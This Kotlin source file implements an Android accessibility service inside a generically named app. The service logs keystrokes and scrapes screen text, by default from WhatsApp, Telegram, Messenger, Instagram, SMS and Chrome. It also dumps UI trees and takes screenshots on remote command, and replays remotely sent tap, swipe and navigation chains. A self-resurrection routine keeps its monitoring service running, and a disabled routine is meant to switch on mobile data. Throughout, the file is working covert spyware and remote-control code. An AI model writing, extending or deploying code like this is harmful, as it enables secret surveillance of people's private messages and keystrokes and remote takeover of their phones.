package com.example.myandroid

import kotlinx.coroutines.*

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import android.app.KeyguardManager
import android.os.Handler
import android.os.Looper

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
        fun triggerDataRecovery() {
            instance?.engageGhostHand()
        }
    }

    private var nextAllowedCheck = 0L
    private var cachedRules: JSONObject = JSONObject()
    
    // GHOST HAND STATE
    private var isGhostActive = false
    private var isLookingForToggle = false
    private val targetKeywords = listOf("Mobile data", "Data", "Cellular data", "Internet", "Connexion")
    
    // THROTTLE CONTROL
    private var lastScreenRead: Long = 0
    private val READ_DELAY = 1000L // Only read screen once per second

    // TREE SCRAPER STATE
    private var treeDumpEndTime = 0L
    private var treeDumpDurationMs = 0L
    private var targetDumpPkg: String? = null
    private var pendingTreeCommandId: Int = -1
    private var pendingTreeDepth: Int = 10
    private var treeSessionJob: Job? = null
    private var latestTreeSnapshot: JSONObject? = null
    
    // PHOENIX STATE
    private var lastPhoenixCheck = 0L



    private fun checkMainServiceHealth() {
        try {
            if (!MonitorService.isRunning) {
                DebugLogger.log("PHOENIX", "Accessibility Symbiote detected dead MonitorService. Resurrecting...")
                val i = Intent(this, MonitorService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(i)
                else startService(i)
                
                // Also re-ignite the alarm manager loop
                KeepAliveReceiver.scheduleNext(this)
            }
        } catch (e: Exception) {}
    }

        fun startTreeDump(pkg: String?, mins: Long, cmdId: Int = -1, depth: Int = 10) {
        val editor = getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
        treeSessionJob?.cancel()
        
        if (mins <= 0L) {
            editor.putLong("tree_dump_end", 0L).putLong("tree_duration_ms", 0L)
                  .putString("tree_dump_pkg", "").putInt("tree_cmd_id", -1)
                  .putInt("tree_depth", 10).apply()
            treeDumpEndTime = 0L
            treeDumpDurationMs = 0L
            targetDumpPkg = null
            pendingTreeCommandId = -1
            latestTreeSnapshot = null
            DebugLogger.log("SCRAM", "Scraper Disengaged")
            return
        }

        val target = if (pkg.isNullOrEmpty() || pkg == "null") "" else pkg
        val durMs = mins * 60 * 1000
        
        editor.putLong("tree_dump_end", 0L) // 0 means waiting for target
            .putLong("tree_duration_ms", durMs)
            .putString("tree_dump_pkg", target)
            .putInt("tree_cmd_id", cmdId)
            .putInt("tree_depth", depth)
            .apply()
            
        targetDumpPkg = if (target.isEmpty()) null else target
        treeDumpDurationMs = durMs
        treeDumpEndTime = 0L
        pendingTreeCommandId = cmdId
        pendingTreeDepth = depth
        latestTreeSnapshot = null
        
        DebugLogger.log("SCRAM", "Scraper Armed: [${targetDumpPkg ?: "GLOBAL"}] - Waiting for foreground...")
        
        if (targetDumpPkg == null) {
            resumeOrStartWatchdog()
        }
    }

    private fun resumeOrStartWatchdog() {
        if (treeDumpEndTime == 0L) {
            treeDumpEndTime = System.currentTimeMillis() + treeDumpDurationMs
            getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                .putLong("tree_dump_end", treeDumpEndTime).apply()
            DebugLogger.log("SCRAM", "Target acquired. Session started. Resolving in ${treeDumpDurationMs / 1000}s.")
        }
        
        treeSessionJob?.cancel()
        treeSessionJob = CoroutineScope(Dispatchers.IO).launch {
            val delayMs = treeDumpEndTime - System.currentTimeMillis()
            if (delayMs > 0) delay(delayMs)
            
            if (pendingTreeCommandId != -1) {
                val idToComplete = pendingTreeCommandId
                val depth = pendingTreeDepth
                pendingTreeCommandId = -1
                treeDumpEndTime = 0L
                getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                    .putLong("tree_dump_end", 0L).putInt("tree_cmd_id", -1).apply()
                    
                val result = JSONObject().apply {
                    put("depth_limit", depth)
                    if (latestTreeSnapshot != null) put("snapshot", latestTreeSnapshot)
                    else put("error", "NO_DATA_CAPTURED_IN_SESSION")
                }
                CommandProcessor.updateCommandStatus(applicationContext, idToComplete, "SCAN_COMPLETE", null, result, null)
                DebugLogger.log("SCRAM", "Session expired. Command [$idToComplete] resolved.")
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this



        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        
        // Restore Scraper Session
        treeDumpEndTime = prefs.getLong("tree_dump_end", 0L)
        treeDumpDurationMs = prefs.getLong("tree_duration_ms", 0L)
        val savedPkg = prefs.getString("tree_dump_pkg", "") ?: ""
        targetDumpPkg = if (savedPkg.isEmpty()) null else savedPkg
        pendingTreeCommandId = prefs.getInt("tree_cmd_id", -1)
        pendingTreeDepth = prefs.getInt("tree_depth", 10)
        
        if (pendingTreeCommandId != -1) {
            if (treeDumpEndTime > System.currentTimeMillis()) {
                // Session was actively running, resume watchdog
                resumeOrStartWatchdog()
            } else if (treeDumpEndTime in 1..System.currentTimeMillis()) {
                // Session expired while service was dead
                val idToComplete = pendingTreeCommandId
                pendingTreeCommandId = -1
                treeDumpEndTime = 0L
                prefs.edit().putLong("tree_dump_end", 0L).putInt("tree_cmd_id", -1).apply()
                val result = JSONObject().apply { put("depth_limit", pendingTreeDepth); put("error", "SERVICE_RESTARTED_SESSION_EXPIRED") }
                CoroutineScope(Dispatchers.IO).launch {
                    CommandProcessor.updateCommandStatus(applicationContext, idToComplete, "SCAN_COMPLETE", null, result, null)
                }
            }
            // If treeDumpEndTime == 0, we are just waiting for the app to open. Do nothing yet.
        }
        
        val rulesStr = prefs.getString("cached_rules", "{}")
        cachedRules = try {
            val json = JSONObject(rulesStr)
            if (json.length() == 0) getDefaultRules() else json
        } catch (e: Exception) {
            getDefaultRules()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        val pkgName = event.packageName?.toString() ?: return
        
        // --- 0. PHOENIX HOOK (Resurrection check) ---
        val now = System.currentTimeMillis()
        if (now - lastPhoenixCheck > 60000) { // Throttle checks to once a minute maximum
            lastPhoenixCheck = now
            checkMainServiceHealth()
        }

        // --- 1. GHOST HAND LOGIC ---
        if (isGhostActive) {
            handleGhostEvent(event)
        }

        // --- 1.5 TREE SCRAPER ENGINE (Session-Based) ---
        if (pendingTreeCommandId != -1) {
            if (targetDumpPkg == null || targetDumpPkg == pkgName) {
                
                // If waiting for the target app, START the timer now
                if (treeDumpEndTime == 0L) {
                    resumeOrStartWatchdog()
                    CoroutineScope(Dispatchers.IO).launch {
                        CommandProcessor.updateCommandStatus(applicationContext, pendingTreeCommandId, "TARGET_ACQUIRED_RECORDING", null, null, null)
                    }
                }
                
                val root = rootInActiveWindow
                if (root != null && treeDumpEndTime > 0 && now < treeDumpEndTime) {
                    // Standard Session Logging & Memory Update (Throttled)
                    if (now - lastScreenRead > 2000) {
                        val treeJson = serializeNode(root, 0, pendingTreeDepth)
                        latestTreeSnapshot = treeJson // Save the latest frame for the end of the session
                        
                        val wrapper = JSONObject()
                        wrapper.put("pkg", pkgName)
                        wrapper.put("ts", now)
                        wrapper.put("tree", treeJson)
                        DumpManager.appendLog("TREE", wrapper)
                        lastScreenRead = now
                    }
                }
            }
        } else if (treeDumpEndTime != 0L) {
             // Cleanup expired session if watchdog didn't catch it
             treeDumpEndTime = 0L
             targetDumpPkg = null
             getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                 .putLong("tree_dump_end", 0L).apply()
             DebugLogger.log("SCRAM", "Scraper Session Expired and Cleaned")
        }

        // --- 2. STANDARD MONITORING ---
        if (now < nextAllowedCheck) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             // Logic delegated to TypingManager
            val text = event.text.joinToString(" ")
            TypingManager.onType(this, pkgName, text)
            return
        }

        if (cachedRules.length() > 0 && !cachedRules.has(pkgName)) return
        
        // Feature Gate: Screen Reader
        if (!ConfigManager.canCollect(this, "screen_reader")) return

        // THROTTLE: Prevent high CPU usage during scrolling
        if (now - lastScreenRead < READ_DELAY) return
        lastScreenRead = now

        val source = event.source ?: return
        val textContent = StringBuilder()
        extractText(source, textContent)
        
        if (textContent.isNotEmpty()) {
            val pm = packageManager
            val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
            val newTxt = textContent.take(100).toString()
            
            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val historyStr = prefs.getString("text_history_by_app", "{}")
                val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
                val appArray = rootJson.optJSONArray(appName) ?: JSONArray()

                val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
                
                if (newTxt != lastTxt) {
                    nextAllowedCheck = System.currentTimeMillis() + 500
                    
                    // 1. STREAM LOGGING (NO LAG)
                    val entry = JSONObject()
                    entry.put("pkg", appName)
                    entry.put("ts", System.currentTimeMillis())
                    entry.put("txt", newTxt)
                    DumpManager.appendLog("SCREEN", entry)
                    
                    // 2. Update Stats (Using commit() to bypass QueuedWork ANR)
                    prefs.edit()
                        .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
                        .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
                        .commit()

                    // 3. Verify
                    DumpManager.logVerification("READER", pkgName)
                } else {
                    nextAllowedCheck = System.currentTimeMillis() + 3000
                }
            }
        }
    }

    fun engageGhostHand() {
        // Logic disabled: UI interaction is too fragile and manufacturer-dependent
        DebugLogger.log("GHOST", "Ghost Hand engagement skipped (Disabled)")
    }

    private fun handleGhostEvent(event: AccessibilityEvent) {
        // No-op: Ghost logic disabled
    }

    private fun performSwipeDown() {
        // No-op: Ghost logic disabled
    }

    private fun findAndClickToggle(node: AccessibilityNodeInfo): Boolean {
        // No-op: Ghost logic disabled
        return false
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null && node.text.isNotEmpty()) sb.append(node.text).append(" ")
        for (i in 0 until node.childCount) extractText(node.getChild(i), sb)
    }

    fun serializeNode(node: AccessibilityNodeInfo?, depth: Int, maxDepth: Int): JSONObject? {
        if (node == null || depth > maxDepth) return null
        val json = JSONObject()
        try {
            json.put("class", node.className?.toString() ?: "")
            json.put("text", node.text?.toString() ?: "")
            json.put("desc", node.contentDescription?.toString() ?: "")
            json.put("id", node.viewIdResourceName ?: "")
            json.put("clickable", node.isClickable)
            
            val bounds = android.graphics.Rect()
            node.getBoundsInScreen(bounds)
            json.put("bounds", "${bounds.left},${bounds.top},${bounds.right},${bounds.bottom}")

            if (node.childCount > 0 && depth < maxDepth) {
                val children = JSONArray()
                for (i in 0 until node.childCount) {
                    val child = serializeNode(node.getChild(i), depth + 1, maxDepth)
                    if (child != null) children.put(child)
                }
                json.put("children", children)
            }
        } catch (e: Exception) {}
        return json
    }

    fun getInstantTree(targetPkg: String?, maxDepth: Int): JSONObject {
        val result = JSONObject()
        try {
            val root = rootInActiveWindow ?: return result.put("error", "NO_ACTIVE_WINDOW")
            val currentPkg = root.packageName?.toString() ?: ""
            
            if (targetPkg != null && targetPkg != "null" && targetPkg != currentPkg) {
                return result.put("error", "TARGET_NOT_IN_FOREGROUND").put("found", currentPkg)
            }

            result.put("package", currentPkg)
            result.put("timestamp", System.currentTimeMillis())
            result.put("tree", serializeNode(root, 0, maxDepth))
        } catch (e: Exception) { result.put("error", e.message) }
        return result
    }

    override fun onInterrupt() {}

    // --- REMOTE INTERACTION ENGINE (CHAIN CAPABLE) ---
    suspend fun executeInteractionChain(chain: JSONArray): String {
        val report = StringBuilder()
        for (i in 0 until chain.length()) {
            val step = chain.getJSONObject(i)
            val type = step.optString("type").uppercase()
            val value = step.optString("val")
            
            delay(step.optLong("delay", 100L)) // Short mandatory delay between steps for OS processing

            val success = when (type) {
                "WAIT" -> { delay(value.toLongOrNull() ?: 500L); true }
                "NAV" -> {
                    val actionCode = when(value.uppercase()) {
                        "BACK" -> GLOBAL_ACTION_BACK
                        "HOME" -> GLOBAL_ACTION_HOME
                        "RECENTS" -> GLOBAL_ACTION_RECENTS
                        "NOTIFS" -> GLOBAL_ACTION_NOTIFICATIONS
                        else -> 0
                    }
                    if (actionCode == 0) false else performGlobalAction(actionCode)
                }
                "TAP" -> {
                    val coords = value.split("|", ",")
                    dispatchClick(coords[0].toFloat(), coords[1].toFloat())
                }
                "NODE" -> {
                    val root = rootInActiveWindow
                    val nodes = root?.findAccessibilityNodeInfosByViewId(value)
                    val node = nodes?.firstOrNull() ?: root?.findAccessibilityNodeInfosByText(value)?.firstOrNull()
                    if (node != null) {
                        val bounds = android.graphics.Rect()
                        node.getBoundsInScreen(bounds)
                        dispatchClick(bounds.centerX().toFloat(), bounds.centerY().toFloat())
                    } else false
                }
                "SWIPE" -> {
                    val p = value.split("|", ",")
                    dispatchGesturePath(listOf(Pair(p[0].toFloat(), p[1].toFloat()), Pair(p[2].toFloat(), p[3].toFloat())), p.getOrNull(4)?.toLongOrNull() ?: 300L)
                }
                else -> false
            }
            report.append("Step $i ($type): ${if(success) "OK" else "FAIL"}; ")
        }
        return report.toString()
    }

        private suspend fun dispatchClick(x: Float, y: Float): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val km = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
        
        DebugLogger.log("GHOST_DEBUG", "Attempting Tap at [$x, $y] | Screen: ${pm.isInteractive} | Locked: ${km.isKeyguardLocked}")

        val path = android.graphics.Path()
        path.moveTo(x, y)
        // Wiggle: Move 1 pixel down and back to ensure the touch digitizer registers it as a physical event
        path.lineTo(x, y + 1)
        path.lineTo(x, y)

        val builder = android.accessibilityservice.GestureDescription.Builder()
        // A slightly longer duration (150ms) ensures the system 'feels' the press
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 150))
        
        val deferred = CompletableDeferred<Boolean>()
        try {
            val dispatched = dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture confirmed by OS at $x,$y")
                    deferred.complete(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture REJECTED by OS. Check if screen is locked or overlapping system UI.")
                    deferred.complete(false)
                }
            }, Handler(Looper.getMainLooper()))
            
            if (!dispatched) deferred.complete(false)
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", "Gesture Dispatch Failed: ${e.message}")
            deferred.complete(false)
        }
        
        // Wait for OS callback, but safeguard against infinite hang if OS drops the event
        return withTimeoutOrNull(2000) { deferred.await() } ?: false
    }

    private suspend fun dispatchGesturePath(points: List<Pair<Float, Float>>, dur: Long): Boolean {
        val path = android.graphics.Path()
        val start = points.first()
        path.moveTo(start.first, start.second)
        
        points.drop(1).forEach { (x, y) ->
            path.lineTo(x, y)
        }

        val builder = android.accessibilityservice.GestureDescription.Builder()
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, dur))
        
        val deferred = CompletableDeferred<Boolean>()
        try {
            val dispatched = dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture Path Completed")
                    deferred.complete(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture Cancelled by System")
                    deferred.complete(false)
                }
            }, Handler(Looper.getMainLooper()))
            
            if (!dispatched) deferred.complete(false)
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", e.message ?: "Unknown")
            deferred.complete(false)
        }
        
        return withTimeoutOrNull(dur + 2000) { deferred.await() } ?: false
    }

    fun captureScreenshot(quality: Int, callback: (java.io.File?) -> Unit) {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            DebugLogger.log("SCREENSHOT_ERR", "API 30+ required for background screenshot.")
            callback(null)
            return
        }

        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, applicationContext.mainExecutor, object : AccessibilityService.TakeScreenshotCallback {
            override fun onSuccess(screenshot: ScreenshotResult) {
                try {
                    val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                    if (bitmap == null) { callback(null); return }
                    
                    val file = java.io.File(cacheDir, "scrn_${System.currentTimeMillis()}.jpg")
                    java.io.FileOutputStream(file).use { out ->
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, out)
                    }
                    screenshot.hardwareBuffer.close()
                    callback(file)
                } catch (e: Exception) {
                    DebugLogger.log("SCREENSHOT_ERR", "Processing failed: ${e.message}")
                    callback(null)
                }
            }
            override fun onFailure(errorCode: Int) {
                DebugLogger.log("SCREENSHOT_ERR", "System denied capture. Error code: $errorCode")
                callback(null)
            }
        })
    }

    private fun getDefaultRules(): JSONObject {
        val defaults = JSONObject()
        val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.imo.android.imoimlite", "com.imo.android.imoimbeta", "com.imo.android.imoimhd", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
        for (app in apps) defaults.put(app, JSONObject())
        return defaults
    }
}
